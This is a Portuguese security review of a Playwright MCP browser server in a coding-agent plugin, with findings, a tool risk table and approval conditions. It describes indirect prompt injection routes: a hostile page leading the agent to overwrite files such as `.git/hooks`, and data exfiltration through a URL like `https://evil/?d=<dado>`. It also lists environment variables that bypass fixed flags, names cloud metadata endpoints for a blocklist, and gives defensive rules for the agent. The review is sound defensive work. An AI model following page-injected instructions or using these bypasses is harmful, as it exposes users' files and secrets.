# Parecer de segurança: MCP Playwright no plugin sdd (playwright-mcp)

Revisor: sdd:security (independente), 2026-10-14. Escopo: spec.md, `.mcp.json`, `mcp/playwright.js`, `agents/frontend.md`, skill `frontend-engineering`,
templates `project-settings.git|local.json`, teste `req010-playwright.test.sh`, `.gitignore` e `tools` de todos os agentes. Somente leitura; nada executado
(consulta apenas a `npm view @playwright/mcp@0.0.83`: integridade confere com a spec, dependências exatas `playwright`/`playwright-core` `1.64.0-alpha-1790635538000`).

## Parecer final: APROVADO COM CONDIÇÕES

Não há achado HIGH. A superfície foi bem reduzida (21 ferramentas, `--isolated`, versão fixa, deny/ask, `tools` explícito em todos os agentes). As condições C1 a C5
(MEDIUM) devem ser fechadas antes do release; as LOW podem ir em backlog.

## Achados

### MEDIUM

**M1. WebMCP habilitado por padrão (páginas registram ferramentas que o servidor expõe ao agente).** O README 0.0.83 traz `--no-webmcp` ("não coletar nem expor as
ferramentas que uma página registra pela API WebMCP"; `webmcp` "Enabled by default"). É superfície de injeção controlada pela página, fora das 25 ferramentas do spec. O
`tools` explícito do `frontend` as barra, mas a sessão sem `--agent` e subagentes sem `tools` as veriam (com prompt de permissão). Correção: acrescentar `--no-webmcp`
a `ARGS` (e ao teste: obrigatória). Custo zero.

**M2. Variáveis de ambiente `PLAYWRIGHT_MCP_*` (e npm/Playwright) herdadas anulam as "flags constantes".** `spawn` herda `process.env`; cada opção tem env equivalente
(`PLAYWRIGHT_MCP_EXTENSION`, `_USER_DATA_DIR`, `_CAPS`, `_ALLOW_UNRESTRICTED_FILE_ACCESS`, `_CDP_ENDPOINT`, `_CONFIG`, `_INIT_SCRIPT`, `_IGNORE_HTTPS_ERRORS`, `_NO_SANDBOX`,
`_SECRETS_FILE`, `_STORAGE_STATE`, `_EXECUTABLE_PATH`). O teste req010 só olha o texto do lançador, então a proibição de flags é contornável pelo ambiente (inclusive
`--extension`, que usaria o navegador e as sessões reais do usuário). Também herdam-se `npm_config_registry`/`NPM_CONFIG_*`, `PLAYWRIGHT_DOWNLOAD_HOST`,
`PLAYWRIGHT_BROWSERS_PATH`, `NODE_OPTIONS`. Correção: no lançador montar `env` filtrado que remova toda chave `/^(PLAYWRIGHT_MCP_|PLAYWRIGHT_DOWNLOAD|npm_config_)/i`
(preservar `PATH`, `HOME/USERPROFILE`, `APPDATA`, `SystemRoot`, proxy `HTTP(S)_PROXY`) e passar `{ env }` ao `spawn`; teste: grep da filtragem. (Nota: ao remover
`npm_config_*` perde-se registry corporativo; manter `NPM_CONFIG_REGISTRY` só se o usuário optar, documentado.)

**M3. Parâmetro `filename` grava no workspace fora das regras de permissão do Claude Code.** `browser_snapshot`, `browser_network_request(s)`, `browser_console_messages`,
`browser_find`, `browser_take_screenshot` aceitam `filename` resolvido contra a raiz do workspace e o conteúdo é derivado da página. Essas gravações são do processo MCP e
não passam pelas regras `Edit(...)`/`Read(...)` dos templates (ex.: `Edit(**/.env)`, `Edit(**/.git/**)`, `ask Edit(.claude/settings.local.json)`). Uma página com injeção pode
induzir o agente a sobrescrever arquivo do projeto (ex.: `.claude/settings.local.json`, `.git/hooks/*`, `package.json`) com conteúdo controlado por ela. Correção:
(a) regra no `frontend.md`: "não usar o parâmetro `filename` das ferramentas do navegador (sai em `.playwright-mcp/` por padrão)"; (b) acrescentar `--output-dir`
não resolve (nomes explícitos o ignoram); portanto (a) é a mitigação, mais: (c) opcional, hook PreToolUse que bloqueia `mcp__plugin_sdd_playwright__*` com `filename`
não vazio fora de `.playwright-mcp/`.

**M4. Cobertura de "ask" apenas em `browser_navigate`: navegação por clique/`browser_tabs new`/`press_key` não pede confirmação e pode sair do escopo.** `browser_tabs`
(action `new`, `url`) navega sem passar pelo ask; `click` em link, `press_key` Enter, `fill_form` submit e redirecionamentos HTTP também. As origens do pacote "não valem
para redirecionamentos" e não são fronteira. Correção: (a) mover `browser_tabs` para `ask` nos templates (ou removê-lo do frontend, ver tabela); (b) regra no
`frontend.md`: "antes de clicar em link, verificar o destino no snapshot; não abrir abas com `browser_tabs`; se a URL atual sair de `localhost`/`127.0.0.1`, voltar
(`browser_navigate_back`) e sinalizar"; (c) defesa em profundidade com origens (ver Q3). O ask em `navigate` é bom, mas dá falsa sensação de cobertura total.

**M5. Exposição de segredos do app ao contexto do modelo (e a logs/relatórios) via rede e console.** `browser_network_request` devolve cabeçalhos e corpo completos
(Authorization, cookies, tokens de API, respostas com dados), `browser_console_messages` e snapshot de campos preenchidos também. O texto vira contexto do modelo e pode
ir para relatório/transcrição. Correção: regra explícita no `frontend.md`: "usar `browser_network_requests` (lista) para status/URL; só chamar `browser_network_request`
com `part` específico (ex. status/corpo de erro), nunca cabeçalhos de request/`Authorization`/cookies; nunca copiar valores de token em relatórios". Se isso não for
aceitável, retirar `browser_network_request` (ver Q4).

### LOW

**L1. Cadeia de suprimentos: `npx -y` a cada sessão, registro resolvido em tempo de execução, sem verificação de integridade pelo lançador.** A integridade da spec é só
documental; o `-y` aceita instalar sem confirmação e o npm usa `.npmrc` do projeto/usuário (registry alterado, `ignore-scripts`). Pacote 0.x da Microsoft com dependência
alpha exata; Playwright baixa Chrome for Testing apenas se o canal `chrome` não existir (o padrão usa o Chrome instalado; sem ele o MCP pede `browser_install`, que não
está liberado ao agente, e o download vem de CDN da Microsoft com checksum do próprio Playwright). Mitigações: (a) M2 cobre o registry por env; (b) registrar no
CHANGELOG a política de bump (spec + `npm view ... dist.integrity` conferido + revisão); (c) opcional futuro: vendorizar/`npm ci` com lockfile no plugin
(`package-lock.json` com integridade) e executar `node_modules/.bin/playwright-mcp`, eliminando resolução por sessão (já está "fora de escopo" na spec: aceitável).
Sem `--browser`, o navegador depende do Chrome instalado: documentar que Chrome desatualizado enfraquece o sandbox.

**L2. Servidor sobe em toda sessão com o plugin habilitado, mesmo sem frontend.** Impacto: `npx` por sessão (latência, rede, possível download), processo Node, e
as ferramentas `browser_*` aparecem para a sessão principal e agentes sem `tools` (o navegador só abre no primeiro uso, o que limita a exposição). Desligar: `/mcp`
(desabilitar `plugin:sdd:playwright`) por sessão; persistente via `disabledMcpServers` nos settings do projeto/usuário (ou `deniedMcpServers`/`allowedMcpServers` em
política gerenciada; confirmar o identificador exato no CLI da versão em uso, não verificado aqui). Documentar no README e no manual. Aceitável.

**L3. Perfil real do usuário e `--isolated`.** Com `--isolated` o perfil fica em memória e cookies/localStorage somem ao fechar (`browser_close`) ou ao fim da sessão;
o Playwright lança uma instância própria do Chrome com diretório temporário, não o perfil padrão do usuário (`%LOCALAPPDATA%\Google\Chrome\User Data`), então logins reais
não são tocados. Os riscos residuais são: (i) `--extension` e `--cdp-endpoint` por env (M2); (ii) dentro da sessão, cookies de `localhost` persistem entre navegações
até `browser_close` (todo app em `localhost:*` compartilha cookies por host, não por porta: um app dev pode ver cookies de outro app dev na mesma sessão); recomendar
`browser_close` entre apps. Cobre sessões e cookies de verdade para o requisito; sem achado adicional.

**L4. Saídas em disco (`.playwright-mcp/`).** O `.gitignore` do repositório do framework e os templates de projeto não listam `.playwright-mcp/` (a regra só existe em
texto no `frontend.md`, "acrescentar ao `.gitignore` do projeto" — depende do agente lembrar). Snapshots, screenshots, console e rede (M5) caem em `.playwright-mcp/` na
raiz do projeto e podem ser incluídos por `git add .` (que está em ask/deny, bom, mas `git add src`/commits do TechLead não protegem de adição manual). Correção:
adicionar `.playwright-mcp/` ao `.gitignore` do framework e ao modelo `CLAUDE.workspace.md`/templates (ou checklist do TechLead), e uma verificação no teste req010.
O pacote tem `--output-max-size` (evicção) mas a limpeza não é automática: pedir remoção ao fim da task.

**L5. Lançador: pontos de robustez.** (i) Fallback Windows `shell: true` com `npx.cmd`: argumentos são constantes sem metacaracteres, então não há injeção; contudo o
`.cmd` via cmd.exe cria um intermediário; quando `npx-cli.js` do Node não existe, o `child.kill(sinal)` mata só o `cmd.exe` e pode deixar o npx/Chrome órfãos. Preferir
`taskkill /T` ou aceitar e documentar (o caminho principal sem shell está correto). (ii) `child.kill("SIGINT"/"SIGTERM")` no Windows termina o processo sem sinal gracioso
(aceitável). (iii) Não trata `stdin` fechado (o Claude Code encerra o filho): o `npx` herda o stdin e sai por EOF; OK. (iv) `exit` com `code===null` (morto por
sinal) vira 1: OK. (v) `cwd` herdado = diretório do projeto: o npm lê o `.npmrc` do projeto (cobrir em L1/M2, ou `cwd: os.tmpdir()` para o `npx`; atenção: o servidor usa o
cwd como raiz do workspace para gravar `.playwright-mcp/`, então mudar o cwd altera o destino das saídas; alternativa: `--prefix`/`npm_config_userconfig` controlados).
(vi) Sem `--headless`: abre janela visível, o que é desejável para ver a execução, mas o teste proíbe `--headless` por padrão de projeto; coerente, só documentar (a spec
cita teste com `--headless`, o lançador não o usa).

**L6. Teste req010: lacunas.** Bom: JSON exato, pin exato, 9 flags proibidas só fora de comentário, lista de ferramentas exata, outros agentes sem playwright, deny/ask
nos dois templates, publicação sem playwright. Faltam: (a) exigir `--no-webmcp` e `--isolated` (hoje `--isolated` é exigido pela linha ARGS exata, ok); (b) checar que
o lançador não propaga `PLAYWRIGHT_MCP_*` (M2); (c) `--blocked-origins`/`--allowed-origins` se adotados; (d) `--sandbox`/`--no-sandbox` já cobre só `--no-sandbox`; (e) a
verificação por `grep -v '^[[:space:]]*//'` não pega flags montadas por concatenação (`"--" + "caps"`) nem em env: reforçar com o teste de env acima; (f) o grep
`\b` após o nome (`$2\b`) para `browser_navigate` casa também `browser_navigate_back`, então um `browser_navigate` removido passaria despercebido (a contagem exata
= 21 mitiga); usar `grep -qE "${P}${t}(,|$)"`; (g) o teste do `.gitignore` (L4). Não executei o teste.

**L7. Templates.** `deny` das 4 e `ask` de `browser_navigate` estão presentes e idênticos nos dois templates (confirmado por leitura). Observação: `deny`/`ask`
só valem em projetos que copiaram o template; a defesa estrutural das 4 é `tools` do `frontend`, não os settings. Conferir se `project-settings.publicacao.json` (grupo de
publicação) não precisa de nada (o teste diz que não). Sem `allow` no template: o usuário recebe prompt em todas as demais ferramentas `browser_*` (ver Q4: desejável,
mas gera fadiga; ver recomendação).

## Respostas às questões obrigatórias

**Q1. Prompt injection indireta.** As regras do `frontend.md` (dado não confiável, escopo local, não seguir pedidos da página) mais o `ask` em `navigate` são
necessárias, não suficientes. Faltam: navegação por clique/`browser_tabs`/redirecionamento (M4); regra sobre `filename` (M3); regra de não ler cabeçalhos/tokens da rede
(M5); WebMCP (M1); regra de que o conteúdo digitado em `browser_type`/`fill_form` é só dado de teste fictício e nunca derivado de arquivo do projeto, `.env` ou saída de
ferramenta (hoje diz "nunca digite credencial, token ou segredo"; acrescentar "nem valor lido de arquivo/ambiente"); screenshot e snapshot em `.playwright-mcp/` (L4).
Também: título de página e mensagens de `handle_dialog`/`console` entram no contexto: a regra já os lista, manter. O teste real (agente ignorando injeção) é evidência
positiva, não garantia: modelo é a última camada, por isso as camadas estruturais acima importam. O `ask` do navigate também protege contra exfiltração por URL
(`https://evil/?d=<dado>`): registrar essa razão no spec e instruir o usuário a ler a URL completa antes de aprovar.

**Q2. `--isolated` e perfil real.** Cobre cookies, localStorage e sessões entre sessões (perfil em memória). Chrome "instalado" é usado como binário, mas com diretório de
perfil temporário/em memória, sem tocar no perfil real do usuário. Ressalvas: variáveis de ambiente (M2: `USER_DATA_DIR`, `EXTENSION`, `CDP_ENDPOINT`) e cookies
compartilhados entre apps `localhost` dentro da mesma sessão (L3). `--extension` continua fora de escopo e agora precisa estar fora também do ambiente.

**Q3. localhost, rede local e metadata.** O navegador chega a `169.254.169.254`, intranet, portas locais e serviços internos por navegação (o Chrome roda na máquina do
usuário, com acesso à rede dele). `--allowed-origins`/`--blocked-origins` valem para requisições de página (não para redirecionamento nem como fronteira), mas como
defesa em profundidade reduzem a chance de uma página local carregar subrecursos internos e a de navegação acidental fora do escopo. Recomendação: **sim, usar
`--blocked-origins`** com lista fixa e constante no lançador: `http://169.254.169.254;http://metadata.google.internal;http://[fd00:ec2::254]` (metadata de nuvem) e
fazer a lista de bloqueio, não de permissão, para não quebrar apps que usam APIs/CDNs/fonts externos; `--allowed-origins` com apenas `http://localhost:*;http://127.0.0.1:*`
quebraria apps legítimos (APIs em outro host, CDN) e, como "Default is to allow all" e não é fronteira, traz pouco ganho: não recomendado como obrigatório (opção futura
configurável, hoje "fora de escopo" na spec, aceitável). Confirmar se o pacote aceita curinga de porta nas origens antes de usar `localhost:*` (não verificado). O
controle real deve ser: `ask` por URL (humano), regra do agente, e rede de desenvolvimento sem acesso a metadata. Registrar a limitação: redes corporativas acessíveis
a partir da máquina do usuário ficam alcançáveis por qualquer navegação aprovada (inclusive via redirecionamento).

**Q4. Classificação das 21 ferramentas** (R = risco; efeito principal):

| Ferramenta | R | Nota |
|---|---|---|
| browser_navigate | Alto (ask) | rede/saída/exfiltração por URL; manter ask |
| browser_tabs | Médio-alto | `new`+`url` navega sem ask (M4); mover para ask ou remover. Preferência: **remover** (a verificação de UI não precisa de várias abas) |
| browser_click | Médio | segue links, envia formulários, dispara ações do app/redirect; sob regra de escopo |
| browser_press_key | Médio | Enter em link/form; equivale a clique |
| browser_type | Médio | texto livre, só dados de teste |
| browser_fill_form | Médio | idem, vários campos; cuidado com submit |
| browser_select_option | Baixo | |
| browser_hover | Baixo | pode disparar menu/tooltip |
| browser_drag | Baixo-médio | sem uso comum em verificação; sem ganho; pode ser removido (reduz superfície) |
| browser_handle_dialog | Baixo | aceita/recusa `alert/confirm/prompt`; `prompt` pode receber texto; manter (sem ela diálogos travam), texto do diálogo é não confiável |
| browser_emulate_media | Baixo | tema/mídia: útil para acessibilidade; manter |
| browser_resize | Baixo | |
| browser_wait_for | Baixo | |
| browser_navigate_back | Baixo | útil como recuperação de saída de escopo |
| browser_snapshot | Baixo-médio | conteúdo não confiável no contexto; `filename` (M3) |
| browser_find | Baixo | só leitura sobre o snapshot; `filename` (M3); manter |
| browser_console_messages | Médio | conteúdo controlado pela página; pode ter segredos do app; `filename` |
| browser_network_requests | Baixo-médio | lista de URLs/status |
| browser_network_request | **Médio-alto** | cabeçalhos/corpo completos, tokens (M5); manter só com regra de `part`, caso contrário remover |
| browser_take_screenshot | Médio | dados do app em disco (L4), `filename` (M3) |
| browser_close | Baixo | necessário (descarta a sessão isolada) |

Saem (recomendado): `browser_tabs` e `browser_drag` (baixa utilidade, superfície real). Condicional: `browser_network_request` (sai se a regra de `part` for
considerada insuficiente; o usuário tem o runner de testes e o DevTools para depurar rede). Ficam: `browser_find`, `browser_handle_dialog`,
`browser_emulate_media`, `browser_network_requests`. Se `tabs`/`drag` saírem, o spec/teste passam de 21 para 19 ferramentas (atualizar REQ-002 e req010).
O prompt de permissão em todas as ferramentas não permitidas explicitamente (sem `allow`) é conservador e aceito.

**Q5. Herança nos outros agentes e na sessão principal.** Confirmado por leitura de `plugins/sdd/agents/*.md`: todos os 8 agentes têm `tools` explícito
(backend, frontend, infra-architect, mobile, security, techlead, tecleader, tests); nenhum recebe ferramentas do Playwright além do `frontend`, e o teste já o verifica.
Atenção: (i) o arquivo `tecleader.md` (tools: Read) é o agente da sessão principal do CLAUDE.md, e o template usa `agent: sdd:techlead` (grafia diferente
entre `tecleader` e `techlead` na documentação: conferir consistência fora deste escopo); o `techlead` tem a ferramenta `Agent`: pode delegar a subagentes
genéricos sem `tools` (que herdam tudo, incluindo `browser_*` e, sem os settings, as 4 ferramentas negadas) — o `deny` dos templates cobre isso nos projetos que o usam,
por isso o `deny` é essencial; para projetos sem o template (plugin instalado sem settings), a sessão e subagentes genéricos veem as 25 ferramentas (inclusive
`browser_evaluate`/`run_code_unsafe`/`file_upload`) com prompt de permissão por padrão. Correção: documentar que o plugin exige os templates de settings; considerar que o
`sdd:techlead` receba `disallowedTools` das 4 (se suportado no frontmatter da versão do Claude Code em uso, não verificado) ou adicionar ao hook de sessão um aviso
quando o `deny` estiver ausente.

**Q6. Cadeia de suprimentos.** Ver L1. Integridade da spec confere com o registro. Risco aceitável com mitigação de env/registry (M2), pin exato (presente) e
processo de bump. O alpha do Playwright é fixado exato (bom), mas por ser 0.x/alpha pode conter regressões de segurança sem aviso: acompanhar avisos do repositório a
cada release do plugin. Download do navegador: não ocorre se houver Chrome; `browser_install` não está liberado.

**Q7. Servidor em toda sessão.** Ver L2: custo de `npx`/rede por sessão e superfície visível, mas o navegador só abre ao primeiro uso. Desligamento: `/mcp`,
`disabledMcpServers` no settings do projeto/usuário. Documentar. Aceitável.

**Q8. Saídas em disco.** Ver L4 e M3/M5.

**Q9. Lançador e teste.** Ver L5 e L6. Sem execução de código de entrada do usuário, sem rede própria, stdout limpo, argumentos constantes, versão exata: correto.

## Condições para aprovação final (todas objetivas)

- C1 (M1): acrescentar `--no-webmcp` a `ARGS` e exigi-lo no teste.
- C2 (M2): lançador passa `env` filtrado sem `PLAYWRIGHT_MCP_*`, `PLAYWRIGHT_DOWNLOAD*`, `npm_config_*`; teste correspondente.
- C3 (M3 e M5): regras no `frontend.md` (e resumo na skill): proibido usar `filename`; `browser_network_request` só com `part` e sem cabeçalhos/tokens; valores
  digitados nunca vêm de arquivos/ambiente; não abrir abas nem seguir link para fora de `localhost`.
- C4 (M4): `browser_tabs` e `browser_drag` removidos do `frontend` (19 ferramentas; ajustar REQ-002, testes, docs) ou, no mínimo, `browser_tabs` em `ask`.
- C5 (L4, recomendado fortemente): `.playwright-mcp/` no `.gitignore` do framework e nos modelos, com teste.
- Recomendadas (não bloqueantes): `--blocked-origins` de metadata (Q3), `--block-service-workers`, documentar desligamento do servidor (L2), corrigir `\b` no teste (L6).

## Resumo (12 linhas)

1. Parecer: APROVADO COM CONDIÇÕES; 0 HIGH, 5 MEDIUM, 7 LOW.
2. M1: WebMCP vem habilitado; adicionar `--no-webmcp`.
3. M2: env `PLAYWRIGHT_MCP_*`/npm herdado contorna as flags fixas (até `--extension`); filtrar `env` no lançador.
4. M3: `filename` das ferramentas grava no workspace sem passar pelas regras Edit/Read; proibir no `frontend.md`.
5. M4: só `navigate` tem ask; `browser_tabs` e clique em link navegam; remover `tabs`/`drag` (ou ask em `tabs`).
6. M5: `browser_network_request` expõe cabeçalhos/tokens; restringir a `part` ou remover.
7. `--isolated` cobre sessões; perfil real do Chrome não é tocado (salvo via env, M2).
8. Metadata/intranet: `--blocked-origins` de metadata é útil; allowlist de localhost não recomendada (não é fronteira).
9. Todos os 8 agentes têm `tools` explícito; deny dos templates é essencial para sessão/subagentes genéricos.
10. Cadeia de suprimentos: integridade confere; pin exato; aceitável com M2 e política de bump.
11. `.playwright-mcp/` não está no `.gitignore` nem nos modelos (L4).
12. Teste req010: bom, mas `\b` em `browser_navigate` e falta de checagem de env/`--no-webmcp`.
